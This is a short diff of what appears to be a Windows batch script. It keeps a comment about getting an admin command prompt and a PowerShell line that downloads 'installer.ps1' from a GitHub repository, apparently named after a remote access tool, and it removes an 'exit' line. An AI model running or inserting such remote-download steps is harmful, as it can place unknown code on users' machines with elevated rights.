@@ -32,7 +32,6 @@ REM you can remove the 'powershell' to get an admin CMD
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Zeyadm8112/RattMurdock/blob/main/installer.ps1' -OutFile 'installer.ps1'"
 
 start
-exit
 
 
 
